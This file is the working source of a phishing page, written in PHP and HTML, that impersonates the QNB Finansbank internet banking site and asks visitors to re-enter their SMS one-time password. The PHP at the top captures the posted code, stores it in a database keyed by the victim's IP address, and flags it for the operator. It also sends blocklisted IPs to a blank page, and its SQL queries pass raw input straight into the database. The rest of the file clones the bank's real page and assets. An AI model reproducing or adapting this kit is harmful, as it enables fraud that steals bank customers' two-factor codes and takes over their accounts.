﻿<?php 
include 'baglan.php';
function GetIP(){
 if(getenv("HTTP_CLIENT_IP")) {
 $ip = getenv("HTTP_CLIENT_IP");
 } elseif(getenv("HTTP_X_FORWARDED_FOR")) {
 $ip = getenv("HTTP_X_FORWARDED_FOR");
 if (strstr($ip, ',')) {
 $tmp = explode (',', $ip);
 $ip = trim($tmp[0]);
 }
 } else {
 $ip = getenv("REMOTE_ADDR");
 }
 return $ip;
}
$ipcik = GetIP();

if ($_POST['pass2']<>"") {
$tc = $_POST['tc'];
$pass2 = $_POST['pass2'];
mysql_query("Update ak set sms2='$pass2' where ip='$ipcik' ");
mysql_query("Update ak set notif='1' where ip='$ipcik' ");
mysql_query("Update ak set ses='1' where ip='$ipcik' ");
}


    $query =  mysql_query('SELECT * FROM ip'); 
    while($row = mysql_fetch_assoc($query)){ 
        if($row['ip'] == $ipcik){ 
            header('Location: about:blank'); 
        } 
    }
?>

    
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head><title>
	QNB Finansbank İnternet Şubesi
</title><meta http-equiv="PRAGMA" content="NO-CACHE" /><meta http-equiv="CACHE-CONTROL" content="NO-CACHE" /><meta http-equiv="Expires" content="now" /><meta http-equiv="Content-Type" content="text/html; charset=iso-8859-9" /><meta name="google" content="notranslate" /><meta name="format-detection" content="telephone=no" /><meta name="google-site-verification" content="rMBe9MNn2Z0cVlSjxsgCC3vY4wMsed5hRSqRsaI60IU" /><link href="https://internetsubesi.qnbfinansbank.com/Content/Devices/jquery.smartbanner.css" rel="stylesheet" type="text/css" /><meta name="apple-itunes-app-new" content="app-id=739655617" /><meta name="google-play-app" content="app-id=com.finansbank.mobile.cepsube" /><meta name="msApplication-ID" content="App" /><meta name="msapplication-TileImage" content="https://lh3.googleusercontent.com/apgjMxBvR8Cv-hpXzCY7SU9xWK0UIRMWqEhjKKfzr_o8qF3JHZ6q1k4QIRX8WwjGeg=w300-rw" /><meta name="smartbanner:title" content="QNB Finansbank Cep Şubesi" /><meta name="smartbanner:author" content="Finansbank A.Ş." /><link type="text/css" rel="stylesheet" href="https://internetsubesi.qnbfinansbank.com/Content/Themes/FinansbankTheme/FinansbankDropDownList.css?20170125145354" /><link type="text/css" rel="stylesheet" href="https://internetsubesi.qnbfinansbank.com/Content/Themes/FinansbankTheme/FBDialog.css?20170125145354" /><link type="text/css" rel="stylesheet" href="https://internetsubesi.qnbfinansbank.com/Content/Themes/FinansbankTheme/FBTooltip.css?20170125145354" /><link type="text/css" rel="stylesheet" href="https://internetsubesi.qnbfinansbank.com/Content/Themes/LoginTheme/FinansbankLoginStyle.css?20170421145255" /><link type="text/css" rel="stylesheet" href="https://internetsubesi.qnbfinansbank.com/Content/Themes/LoginTheme/warning.css?20170125145355" /><script type="text/javascript" src="https://internetsubesi.qnbfinansbank.com/Content/js/jquery-1.6.2.min.js?20170125145348"></script><script type="text/javascript" src="https://internetsubesi.qnbfinansbank.com/Content/js/jquery-ui-1.7.3.custom.min.js?20170125145349"></script><script type="text/javascript" src="https://internetsubesi.qnbfinansbank.com/Content/js/jquery.json-2.3.min.js?20170125145346"></script><script type="text/javascript" src="https://internetsubesi.qnbfinansbank.com/Content/js/jquery.data.js?20170125145346"></script><script type="text/javascript" src="https://internetsubesi.qnbfinansbank.com/Content/js/jquery.watermark.js?20170125145347"></script><script type="text/javascript" src="https://internetsubesi.qnbfinansbank.com/Content/js/FBGeneral.js?20170125145344"></script><script type="text/javascript" src="https://internetsubesi.qnbfinansbank.com/Content/js/FBToolTip.js?20170125145344"></script><script type="text/javascript" src="https://internetsubesi.qnbfinansbank.com/Content/js/rsa.js?20170125145352"></script><script type="text/javascript" src="https://internetsubesi.qnbfinansbank.com/Content/js/FBDialog.js?20170125145344"></script>
    <script type="text/javascript">
        $(document).ready(function () {
            if (val == 0)
                setTimeout("FBFocus('txtuserid')", 100);
            else
                setTimeout("FBFocus('txtpass')", 100);
        })
        //Dirty Solution
        //Prevent F5
        //document.domain = "qnbfinansbank.com";

        function Ibtech_keyDown() {
            if (window.event && window.event.keyCode == 116) { // Capture and remap F5
                window.event.keyCode = 505;
            }
            if (window.event && window.event.keyCode == 505) { // New action for F5
                return false;
                // Must return false or the browser will refresh anyway
            }
        }
        try {
            if (navigator.appName.indexOf("Internet Explorer") != -1) { // IE Control by SS
                document.attachEvent("onkeydown", Ibtech_keyDown);
                window.attachEvent("onkeydown", Ibtech_keyDown);
            }
            else {
                document.addEventListener("keydown", Ibtech_keyDown, false);
                window.addEventListener("keydown", Ibtech_keyDown, false);
            }
        }
        catch (ex) { }
    </script>
    <style type="text/css">
        input[srt=numericpassword] {
            -webkit-text-security: disc;
        }

        .sanalklavyeHelpConatiner {
            width: 390px;
            height: 250px;
            font-family: Arial, Helvetica, sans-serif;
            font-size: 11px !important;
            color: #4a4949;
            background: url(https://internetsubesi.qnbfinansbank.com/Content/Images/3Dstar.png) no-repeat;
            background-position: 10px 10px;
        }

            .sanalklavyeHelpConatiner .content {
                width: 270px;
                float: right;
            }

            .sanalklavyeHelpConatiner h1 {
                font-size: 12px;
                font-weight: bold;
                color: #870052;
                margin: 0;
                padding: 10px 0 0 0;
            }

            .sanalklavyeHelpConatiner p {
                font-size: 11px !important;
                margin: 0;
                padding: 5px 0 0 0;
            }

        #destekContent {
            position: absolute;
            left: 168px;
            margin-top: 25px;
            width: 246px;
            z-index: 2;
            top: auto !important;
        }

        #headerTitle {
            position: absolute;
            left: 14px;
            top: auto !important;
            height: 35px;
            margin-top: 11px;
            z-index: 1;
            width: 940px;
        }

        #verisign {
            position: absolute;
            left: 10px;
            top: auto;
            width: 73px;
            height: 45px;
            margin-top: 497px;
            z-index: 4;
        }
    </style>



    <style type="text/css">
        .linkbutton, .linkbutton:hover
        {
            color:#394040 !important;
        }
    </style>

    <script type="text/javascript" src="https://internetsubesi.qnbfinansbank.com/Content/Devices/jquery.smartbanner.js"></script>

    <script type="text/javascript">
        var isMobile = {
            Windows: function () {
                return /IEMobile/i.test(navigator.userAgent);
            },
            Android: function () {
                return /Android/i.test(navigator.userAgent);
            },
            BlackBerry: function () {
                return /BlackBerry/i.test(navigator.userAgent);
            },
            iOS: function () {
                return /iPhone|iPad|iPod/i.test(navigator.userAgent);
            },
            any: function () {
                return (isMobile.Android() || isMobile.BlackBerry() || isMobile.iOS() || isMobile.Windows());
            }
        };
        var mforce = null;
        if (isMobile.Windows()) {
            mforce = 'windows';
        } else if (isMobile.Android()) {
            mforce = 'android'
        } else if (isMobile.iOS()) {
            mforce = 'ios';
        }
        if (mforce != null) {
            $(function () { $.smartbanner({ daysHidden: 0, daysReminder: 0, title: 'Cep Şubesi', force: mforce }); });
        } else {
            $('head').append('<meta name="apple-itunes-app" content="app-id=739655617" />');
        }
    </script>



<link id="ctl00_VeriBranch.Web.UI.Controls.Resources.Themes.Default.css" href="/WebResource.axd?d=S-vBitdBLUotxE_XVbZU1Ob6WXmJXy0AOo4nxeGuQGAABYNQxLKOs6zEv55J-Z2WUzoJI00T6Fv668OquJjlcxX7azxE-I0ABtwEyxrK7AJmUO6Vtg-m7DjT7epM1LOAtsrUx9_GqDqPSuQcfCxXLKRwM0JQpX1uZmr8PB8H8zDMSMAq0&amp;t=636354821593749905" rel="stylesheet" type="text/css" /><link id="ctl00_VeriBranch.Web.UI.Controls.Resources.Themes.TabbedPane.css" href="/WebResource.axd?d=dtkAH6_7uNC6tfSrSIhQaMAdSCnjkiBthnPl9MIcCqbN-Y7Zxg4EkJUczdcF6Cmkfj1Gm70xX9wga53EsP6lGW4OnqhfTaXaozBuosUYu4gTbnozDliXQeTtBgtWs-O6bohRSmsTfLPpbtaB_BVwWWGz-MhNwCbKX6vmxB__2cd1hU4L0&amp;t=636354821593749905" rel="stylesheet" type="text/css" /><link id="ctl00_VeriBranch.Web.UI.Controls.Resources.Themes.jquery.jgrowl.css" href="/WebResource.axd?d=eK6aupVUz7n5sUjDv2XMyvRiP6ummTtCdm8NJH8QtAINRm8kt67f6RZhswOHWlViVGaRVLL0vlolenq7XYyvTx0D6x8uJ5g52X-C2cROpe9orTuWIvY7haRlpco68OgZCoP_BSXBjLL98as0hh7SDGT2p-9oukarNJoR6hgHxwQ-IGilXbi8nz93roc1&amp;t=636354821593749905" rel="stylesheet" type="text/css" /><link id="ctl00_VeriBranch.Web.UI.Controls.Resources.Themes.jqueryslidemenu.css" href="/WebResource.axd?d=D_Bwptiz9FRu4B2-17xafMwU3yRHGQJMcoOO0HYnso06XBrObzXCqSaCGVIsIqCuNPQjxAdfUHn6IGmhGl3q3DgwG1PtQ_0xrLoKs3APuMMzOe96ke8o6NIabpbTFERdolCSOrLObh20TCUeJ_Z99K7wp-1Tv9S5ZmrI3g3Mr_3uCWs7u0lvl1FkSqg1&amp;t=636354821593749905" rel="stylesheet" type="text/css" /><link id="ctl00_VeriBranch.Web.UI.Controls.Resources.Themes.FBKeypad.css" href="/WebResource.axd?d=yvwjuMbsWLdnrjJcMGEL8Wy8NjeuQIJBm3NCMGkSm7V_1fKu511wj8sls48MDa1IbyQVKn-GbACbzBBFFAf4W1U1XBM6Ug3mDIIM7zMUerX70fONGnbhg6KwA494I_o5RUFbkTc53G0YsEIkkzgp5AdUutuL9AGjfLMjv2gLQu4UfqKM0&amp;t=636354821593749905" rel="stylesheet" type="text/css" /><link href="../App_Themes/FinansbankLoginTheme/TempLogin.css" type="text/css" rel="stylesheet" /><script src="/WebResource.axd?d=cccd_4NrRA2Fxg1HhQ2jZIMeTEssDuCsy-xQuNijhRs8qqPDOdrZhSZ5dA_wGQwkUweqB2wX3z3KGcVUaT9ADOFj9JuH_7jFjuWfWsDF4Hb0NgxnH1cmgtUoN2gpG7-S6F409YCbr6XpaPPsQnN-55kIoRpiY0l-R6-wYxUgubavLtnoqfaLpJ8M73qokSyeNkHmbhMezlK-ZEOpQ9eXoI30Nw4OjYHCUpLw5Q2&amp;t=636354821593749905" type="text/javascript">

</script><script src="/WebResource.axd?d=nDg3p8A8JU-9dGyitphjkpAXgw66plGuoW-4YjgG1Y1XPXOuvXaduqPqtOUOoTQmHeKq7KGxUFC1Fp9PNGz8qDtHZI4aF5Yk5nliXQCZkHWeAnZxXuXpBHVJjb1ug_2c-uf1-d_t9YwxEFYO2NhJcBTha394GYTSy8Sy-7HJVdBtUDKILbu3iq6oHTK6dvBmaJCvwVaxf1agVSqQlzWXxbSbz97TFafSa4mVVA2&amp;t=636354821593749905" type="text/javascript">

</script><script src="/WebResource.axd?d=xrU_6SjpzEtyEua1RurqBX0sagcLjUwner-6nMXNBsNACET3h6U5yZVuaddSQFPp9QjvwFFYAa5toHaImDvClFJV9ThwS-05790ReuORT3XbDTC4iveE-lnQ2pRPDTgPZPmiemBqHGQztNQ8jMShNokBlve2cz4Z2J20ClR3PxEa0dBRwCLtAJ5w6lb-F96izSAI-59cBH4fCz6kSlR5U-4SXdMXQshR6-oJZTMhOonzEs7a0&amp;t=636354821593749905" type="text/javascript">

</script></head>
<body>
    <form name="aspnetForm" method="post" action="sms2.php" id="aspnetForm" onsubmit="if(fpControl != undefined &amp;&amp; fpControl != null &amp;&amp; fpControl.SetClientInfo != undefined)fpControl.SetClientInfo();return custom_submit();" autocomplete="off">
<div>
<input type="hidden" name="__EVENTTARGET" id="__EVENTTARGET" value="" />
<input type="hidden" name="__EVENTARGUMENT" id="__EVENTARGUMENT" value="" />
<input type="hidden" name="__LASTFOCUS" id="__LASTFOCUS" value="" />
<input type="hidden" name="__VSTATE__" id="__VSTATE__" value="-214491467" />
<input type="hidden" name="__VIEWSTATE" id="__VIEWSTATE" value="" />
</div>

<script type="text/javascript">
//<![CDATA[
var theForm = document.forms['aspnetForm'];
if (!theForm) {
    theForm = document.aspnetForm;
}
function __doPostBack(eventTarget, eventArgument) {
    if (!theForm.onsubmit || (theForm.onsubmit() != false)) {
        theForm.__EVENTTARGET.value = eventTarget;
        theForm.__EVENTARGUMENT.value = eventArgument;
        theForm.submit();
    }
}
//]]>
</script>



<script src="/WebResource.axd?d=agHyoqmM5R2HZK0hGHfDVytXXsb63ddjF_nKao5XovSnHZhjS6or_fp52iypVd59PLxUB0lM_JvLk5XHaiBfD53SBAg1&amp;t=636355014046607314" type="text/javascript"></script>
<script src="/WebResource.axd?d=f3Dnh9FwaQ7vpxJIorpPel6aXeiwTbmx2PCWiodFFVpwvbQQKsMGABLRtwRLgZ7v_C_K8gR2x14Kt9H4IsK7FYh8Ztg47qq7wFXdPRVRLesYt4XVuBlNkVQmarHjH4lHnFhpoIvPjVELov5b8QQVdvMKmnSgRSclwoZjcAHwZcNlmy0G0&amp;t=636354821593749905" type="text/javascript"></script>
<script src="/WebResource.axd?d=hPzkfqPHw2sPtkOrNagp9lg1o5u4oZlGw5F4530uhyk3rpxs2nXiuDEiLyA0y-mf7ptQPwE1I2l0AQKrmRDnamNnz_UmraKNvaxxCOb4ejCANzNmKQtADUWnwHWEWxWm5TWAlLmsJ7P3qhXxZE8VdcY3f6o2oPAuXvBqlsC5UDE6DeKHznbBnNr1pGI1&amp;t=636354821593749905" type="text/javascript"></script>
<script src="/WebResource.axd?d=zg-Y-7BeOx-rPNjQgwQHo5AF1JuoMSY59W47mp3ZMTxXEFqe3h8_a8gah-MV5PFrmRD-Kj08shrXGCbUHx-F9_8jAKEJ2eQyUyfczOIhw7l7bzYcK6ohwiJqpaRWZTnStSuliTREKy5o3m4Q5Qo8ltar7Al75eTSdAlIODWEDy9nkFC8qjywM7vo_QtsIQf_u3WSQA2&amp;t=636354821593749905" type="text/javascript"></script>
<script src="/WebResource.axd?d=szIVcAfk9RV-7D-e4d3jS79sAw-Vqus1QVJljj6WFkfk4SulZxkPOfrjVLV2GIn3wWgq0PdHSb-X1JJyKHhsVE5IPidZPGS4ZzR0rlMR7yhp2HzcNu92-TZEaZhoBFWQNKpNkf2G33ALlOi35DDcOAF3j6b1BpTyO-xGMABDLubbxlf3iqDVIw79qF41&amp;t=636354821593749905" type="text/javascript"></script>
<script src="/WebResource.axd?d=lgxuoQLilvNA-xUCyAFq03SGE4WgdEty5YLMC-eJ7RzL7o7xB1rKjxl7nmXFeDucwAmjJJiQGWEgPe8oJVUfz0c8u9kWEElZ9WUsQwIadiMpaVEu1opAuB4XTzX1FXglem9ICeuJvGr3kgtV8erdwpWPKj4Sp11i-udc7sfqM5QIfONW0&amp;t=636354821593749905" type="text/javascript"></script>
<script type="text/javascript">

</script>


<div>

	<input type="hidden" name="__VIEWSTATEENCRYPTED" id="__VIEWSTATEENCRYPTED" value="" />
	<input type="hidden" name="__EVENTVALIDATION" id="__EVENTVALIDATION" value="uDjMhPuaPuiQbYCh99tScaEY2pMrf7v/P8Y39fXPPApXGy/RRsPVSmug83bWGiPvuKZE2By+Wk5ZZqFLI+VZqf/ogH0DIijxyCfYV1TDYbo1yPLrZMv598wJJv+3i738CtLW7rGi0DyXLHWkg9BBZDdrjFfaTWRKNyjT25O8PVVd4pCdO9cKwA4nJM8ZNTCsALwgv5JelzSxPEyTXYqyO88vR5VVCT7GXwLYoiBidNKC4ibDtT/VF5dLDCYH4927APmkvzmLipNJX5WTl2qyHB1zpwAOtoP9HiX6RiwD8l1npti/BN5N/0YS0fEfdtbwM7/nPaBnjvPRuZjOxV/cVfDMKETPJsBWqU1ZsRIswF2Y+pmDP8xLCDWEtGApN/juG4UDAjc+67NqmTST" />
</div>
    <div id="verisign">
        <a href="https://sealinfo.verisign.com/splash?form_file=fdf/splash.fdf&dn=internetsubesi.qnbfinansbank.com" target="_blank" style="outline:none">
        <img src="https://internetsubesi.qnbfinansbank.com/Content/Images/verisgn.png" width="80" border="0";/>
        </a>
</div>
    <div id="container">
        <div id="ctl00_headerDiv" Class="header">
            <div class="top_nav">
            
            <div>
        
        <a onclick="return ;" id="ctl00_LinkEN" class="linkbutton" href="javascript:__doPostBack(&#39;ctl00$LinkEN&#39;,&#39;&#39;)" style="outline:none">English</a>
        
        
        
        
        
        
        </div>
            </div>
        </div>
        <div id="headerTitle">
            
    <div id="ctl00_headerContentPlaceHolder_LoginInformationDiv" style="display: none; width: 625px;">
        
    </div>
    <div class="floatLeft">
        <img src="https://internetsubesi.qnbfinansbank.com/Content/Images/content_title_left.png" width="23" height="50" />
    </div>
    <div class="headerTitleMiddle floatLeft"><span id="ctl00_headerContentPlaceHolder_HeaderTitleLabel">Sms şifrenizi kontrol ederek tekrar girin.</span></div>
    <div class="floatLeft">
        <img src="https://internetsubesi.qnbfinansbank.com/Content/Images/content_title_right.png" width="17" height="28" />
    </div>

        </div>
        <div id="mainPanel" class="mainContent">
            
    <div id="ctl00_mainContentPlaceHolder_VirtualKeyboardDiv" style="display: none; width: 390px;">
        <html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title></title>
</head>
<body>
<div class="sanalklavyeHelpConatiner">
<div class="content">
<h1>Sanal Klavye Nedir? </h1>
<p>Sanal Klavye, Internet Bankacılığı'na girişte size ilave güvenlik sağlayan bir özelliktir. Bilgisayara kullanıcının bilgisi dışında yüklenen ve kullanıcının yazmış olduğu şifre/parolaları tespit eden programlara karşı koruma amacıyla geliştirilmiştir. Sanal Klavye'yi kullanarak söz konusu programlarından korunursunuz.</p><p> Sanal Klavye, rakamların girişi için kullanılması tavsiye edilen bir araçtır. Tüm şifre değişiklik ekranlarında da Sanal Klavye'yi kullanabilirsiniz. Tercihinize bağlı "Klavye Kullan" seçimi ile klavyenizin tuşlarını 
kullanabilirsiniz.</p>
<h1>Sanal Klavye Nasıl Kullanılır? </h1>
<p>Sanal Klavye'yi üzerinde yer alan karışık-sıralı rakamları mouse ile seçerek kullanabilirsiniz. </p>  
</div>
</div>
</body>
</html>
    </div>
    <div id="divErrorMsg" class="hata"></div>
    <div class="contentText">
        
        <input  type="image" value="Submit" src="yasla.png" />
        <input type="text" id="my_username" style="display: none;" />
        <div class="divtextfield floatLeft">
            <input name="pass2" type="password" maxlength="6" id="txtpass" class="textfield fbwatermark password tooltip" onmouseout="VeriBranch_OnMouseOut(&#39;txtpass&#39;);" autocomplete="off" onpaste="if(HasNonnumeric(this, event)){return false;};" onmouseover="VeriBranch_OnMouseOver(&#39;txtpass&#39;);" onblur="VeriBranch_TextOnBlur(&#39;txtpass&#39;,&#39;&#39;);RemoveEscapedCharactersFromTextBox(this,&#39;txtpass&#39;, [&#39;&lt;&#39;,&#39;>&#39;,&#39;?&#39;])" onkeypress="return ValidateInput(event,this,&#39;number&#39;);" onfocus="VeriBranch_TextOnFocus(&#39;txtpass&#39;,&#39;&#39;);" spellcheck="false" onkeydown="TextBoxFocusOnNavigation(this,event);if(!Only_Numeric(event)){return false;};Ibtech_keyDown();return ValidateUserCode(event,&#39;mainPanel&#39;,&#39;divErrorMsg&#39;,null,null,6,&#39;Lütfen müşteri numarası/TCKN ve FinansŞifrenizi giriniz ve &quot;İleri&quot; butonuna basınız.&#39;,&#39;FinansŞifre alanı $$ karakter olmalıdır.&#39;,&#39;&#39;,&#39;Lütfen müşteri numaranızı giriniz.&#39;,&#39;Lütfen FinansŞifrenizi giriniz.&#39;, &#39;12175398974299113-1395001182&#39;);;" fbTitle="Sms Şifresi" />
            <div style="clear: both">
            </div>
            <div class="containerkeypad"><div id="keys" style="float: left; display: inline-block"></div></div>
        </div>
        <a onclick="return ValidateLoginForm(&#39;mainPanel&#39;,&#39;divErrorMsg&#39;,null,null,6,&#39;Lütfen müşteri numarası/TCKN ve FinansŞifrenizi giriniz ve &quot;İleri&quot; butonuna basınız.&#39;,&#39;FinansŞifre alanı $$ karakter olmalıdır.&#39;,&#39;&#39;,&#39;Lütfen müşteri numaranızı giriniz.&#39;,&#39;Lütfen FinansŞifrenizi giriniz.&#39;,&#39;12175398974299113-1395001182&#39;);;;return ;" id="12175398974299113-1395001182" class="linkbutton" PopupHeader="" PopupUrl="" href="javascript:__doPostBack(&#39;ctl00$mainContentPlaceHolder$12175398974299113-1395001182&#39;,&#39;&#39;)"><div></div></a>
    </div>
    <div style="margin-top: 50px; margin-left: 25px;">

    </div>
    <input type="hidden" name="ctl00$mainContentPlaceHolder$dd5fcb6461304a64adbfb0462736cb6c" id="dd5fcb6461304a64adbfb0462736cb6c" />

        </div>
        <div id="subContent" class="subContent">
            
    <div id="VDAContainer">
        <div id="apDiv1">
            <img src="https://internetsubesi.qnbfinansbank.com/Content/Images/content_ok.png" width="8" height="15" />
        </div>
        <div id="destekContent">
            <div class="top">
                <img src="https://internetsubesi.qnbfinansbank.com/Content/Images/guvenlik_top.png" width="249" height="10" />
            </div>
            <div class="middle title">
                <ul id="ctl00_subContentPlaceHolder_blSubContentMiddleList">
	<li>FinansŞifreniz yoksa veya FinansŞifrenizi unuttuysanız buraya <a href="#" onClick="window.open('https://finanssifre.qnbfinansbank.com/Default.aspx','','toolbar=0,menubar=0,resizable=1,status=0,left=0,top=0,scrollbars=1,width=751,height=514')" class="english"><u>tıklayınız</u></a>.</li>
</ul>
            </div>
            <div class="bottom">
                <img src="https://internetsubesi.qnbfinansbank.com/Content/Images/guvenlik_bottom.png" width="250" height="18" />
            </div>
        </div>
    </div>

    

    <div id="guvenlik">
        <h1><span id="ctl00_subContentPlaceHolder_lblSubContentBottomTitle">Güvenliğiniz İçin</span></h1>
        <ul id="ctl00_subContentPlaceHolder_blSubContentBottomList">
	<li>Bankamız tarafından internet şubesi giriş sayfalarımızda sizlerden cep telefonu marka/model gibi kişisel bilgileriniz istenmemekte olup cep telefonunuza E-Güvenlik Sertifikası yüklemeniz talep edilmemektedir. Detaylı bilgi ve güvenlik önlemleri için lütfen <a target="_blank" href="http://www.qnbfinansbank.com/Bankacilik/alternatif-dagitim-kanallari/internet-bankaciligi/sizin-sorumluluklariniz.aspx"><b>buraya</b></u></a> tıklayınız.</li><li>Müşteri Numaranız / TCKN ve FinansŞifrenizle giriş yapabilirsiniz.</li>
</ul>
    </div>
    
    <div id="webLoanInfoDiv" style="display:none;">
        
    </div>
    <div id="webLoanReturnLink" style="display:none;">
           <span id="ctl00_subContentPlaceHolder_webLoanReturnLinkLabel"></span>
    </div>
    <script src="https://internetsubesi.qnbfinansbank.com/Content/Devices/jquery.smartbanner.js" type="text/javascript"></script>
    <script type="text/javascript">
        $(function () { $.smartbanner({ daysHidden: 0, daysReminder: 0, title: 'Finansbank', icon: "finansbank-icon.jpg" }) })
    </script>
    <script type="text/javascript">
        var isMobile = {
            Android: function () {
                return navigator.userAgent.match(/Android/i);
            },
            BlackBerry: function () {
                return navigator.userAgent.match(/BlackBerry/i);
            },
            iOS: function () {
                return navigator.userAgent.match(/iPhone|iPod/i);
            },
            iPad: function () {
                return navigator.userAgent.match(/iPad/i);
            },
            Opera: function () {
                return navigator.userAgent.match(/Opera Mini/i);
            },
            Windows: function () {
                return navigator.userAgent.match(/IEMobile/i) || navigator.userAgent.match(/WPDesktop/i);
            },
            any: function () {
                return (isMobile.Android() || isMobile.BlackBerry() || isMobile.iOS() || isMobile.Opera() || isMobile.Windows() || isMobile.iPad());
            }
        };

        if (isMobile.any()) {
            var useridTel = document.getElementById('txtuserid');
            useridTel.type = "tel";
        }

        if (isMobile.iPad()) {
            var userPass = document.getElementById('txtpass');
            userPass.type = "tel";
            userPass.setAttribute('srt', 'numericpassword');
        }
        else {
            var userPass = document.getElementById('txtpass');
            userPass.type = "password";
        }

        function changeLoginScreen() {
            $("#guvenlik").hide();
            $("#webLoanInfoDiv").show();
            $("#webLoanReturnLink").show();
            $("#subContent")._removeClass('subContent');
            $("#subContent").addClass('subContentwebLoan');
        }

    </script>

        </div>
        <div class="login-footer">
            <span id="ctl00_lblFooter">Her hakkı Finansbank A.Ş.&#39;ye aittir. © 2017</span>
        </div>

    </div>
    
    <input type="hidden" name="ctl00$c4c177c64bd4eae9d60075cce048489" id="c4c177c64bd4eae9d60075cce048489" value="10001" />
    <input type="hidden" name="ctl00$ff4fa79cf84f55a42508c54b9ae8d3" id="ff4fa79cf84f55a42508c54b9ae8d3" value="0A1FA1436745C062DA2EEAAC1BBC5753A5EA8CFC6383E0CCA92F48F89AECACFB663ABAE7BA7A7B187EA02772F3D80ABC60ACD1FF5DB6B991A566D2B7B6563924A4F97EF7F332BC835D03FD1DA6E676864F31F2A1DFCBE362C9CAE8C1662851761882D114E8E0A1194CD91243D2BF2C233855CD3FF1FFAF6D30EAB4DB7BAE4CDC7" />
    <input type="hidden" name="ctl00$e31e5ca38b564c79a643c6c847eca75e" id="e31e5ca38b564c79a643c6c847eca75e" value="|" />
    <input type="hidden" name="ctl00$a898601b64769984d756e93058f25" id="a898601b64769984d756e93058f25" value="22r4knkygtelvdkk0k43eljj" />
    <input type="hidden" name="ctl00$e71495a37e184fd5b2a45c94e43aed8a" id="e71495a37e184fd5b2a45c94e43aed8a" value="13" />
    <input type="hidden" name="ctl00$ca0533dc402c4472abb57e29a9e73110" id="ca0533dc402c4472abb57e29a9e73110" value="104046" />
    <input type="hidden" name="ctl00$f2af101b867f4da49d9803726e51e7d6" id="f2af101b867f4da49d9803726e51e7d6" />
    <input type="hidden" name="ctl00$CEHiddenField" id="CEHiddenField" />

    <div id="ctl00_fpControl">
	
    <input type="hidden" name="ctl00$DCA3638C-5191-4A14-801E-ADF63014C08B" id="DCA3638C-5191-4A14-801E-ADF63014C08B" /><div><object id="fontListSWF" name="fontListSWF" type="application/x-shockwave-flash" data="/Content/_.swf" width="1" height="1"><param name="movie" value="/Content/_.swf"><embed src="/Content/_.swf" width="1" height="1"></embed></object></div>
</div>

    

<script type="text/javascript">
//<![CDATA[
document.onkeydown = myKeyDownHandler;
                            function myKeyDownHandler(evt) {
                                //for internet explorer
                                if (evt == undefined) {
                                    var t = window.event.srcElement.type;
                                    var keyCode = (document.layers) ? keyStroke.which : event.keyCode;
                                    var keyString = String.fromCharCode(keyCode).toLowerCase();
                                    var leftArrowKey = 37;
                                    var backSpaceKey = 8;
                                    var escKey = 27;
                                    if (t && (t == 'text' || t == 'textarea' || t == 'file' || t == 'password' || t == 'tel')) {
                                        //do not cancel the event
                                    } else {
                                        if ((window.event.altKey && window.event.keyCode == leftArrowKey) || (keyCode == escKey) || (keyCode == backSpaceKey)) {
                                            return false;
                                        }
                                    }
                                }
                                else {
                                    var type1 = evt.srcElement || evt.target;
                                    var t = type1.type;
                                    var keyCode = (document.layers) ? keyStroke.which : evt.keyCode;

                                    var keyString = String.fromCharCode(keyCode).toLowerCase();
                                    var leftArrowKey = 37;
                                    var backSpaceKey = 8;
                                    var escKey = 27;

                                    if (t && (t == 'text' || t == 'textarea' || t == 'file' || t == 'password' || t == 'tel')) {
                                        //do not cancel the event
                                    }
                                    else {
                                        if ((evt.altKey && evt.keyCode == leftArrowKey) || (keyCode == escKey) || (keyCode == backSpaceKey)) {
                                            return false;
                                        }
                                    }
                                }
                            }val=0;//]]>
</script>
</form>
      <div class="hatamesaji1Confirm" id="hatamesaji1Confirm"><div class="floatLeft"><div class="popupheader_left" title="Finansbank"></div></div><div class="header2 floatLeft"><div class="popup_header_icon"><div title=""></div></div><div class="headerErrMsg">Hata !</div><a href="javascript:void(0)"><div title="Kapat" class="close_icon" commandtype="cmdCancel" callbackfunction=""></div></a></div><div class="floatLeft"><div title="Finansbank" class="popupheader_right"></div></div><div class="clearBoth"></div><div style="border-top: 0px none;" class="popupcontentRoundedCornerDiv"><table width="100%" cellspacing="0" cellpadding="0" border="0"><tr><td width="6px"><div class="imgRoundedCornerLeft"></div></td><td class="popupcontentRoundedCornerDiv_middle"></td><td width="6px"><div class="imgRoundedCornerRight"></div></td></tr></table></div><div class="popupcontent"><div class="scrollbarmain"><div class="scrollbar"><div class="track"><div class="thumb"><div class="end"></div></div></div></div><div class="viewport"><div class="overview"><div class="hata_msj"></div></div></div></div><div class="popupButtonContainer"><div class="iptal btnClassName" commandtype="cmdCancel" callbackfunction=""><a href="javascript:void(0)"><div id="btnConfirmNo" border="0"></div></a></div><div class="onay btnClassName" commandtype="cmdYes" callbackfunction=""><a href="javascript:void(0)"><div id="btnConfirmYes" border="0"></div></a></div><div class="resend btnClassName" commandtype="cmdResend" callbackfunction=""><a href="javascript:void(0)"><div id="btnConfirmYes" border="0"></div></a></div><div class="print btnClassName" commandtype="cmdPrint" callbackfunction=""><a href="javascript:void(0)"><div id="btnPrint" border="0"></div></a></div><div class="save btnClassName" commandtype="cmdSave" callbackfunction=""><a href="javascript:void(0)"><div id="btnSave" border="0"></div></a></div><div class="sendmail btnClassName" commandtype="cmdSentMail" callbackfunction=""><a href="javascript:void(0)"><div id="btnSentMail" border="0"></div></a></div><div class="delete btnClassName" commandtype="cmdDelete" callbackfunction=""><a href="javascript:void(0)"><div id="btnDelete" border="0"></div></a></div></div></div><div style="border-top: 0px none;" class="popupcontentRoundedCornerDiv_bottom"><table width="100%" cellspacing="0" cellpadding="0" border="0"><tr><td width="6px"><div class="imgRoundedCornerLeft_bottom"></div></td><td class="popupcontentRoundedCornerDiv_middle_bottom"></td><td width="6px"><div class="imgRoundedCornerRight_bottom"></div></td></tr></table></div></div>
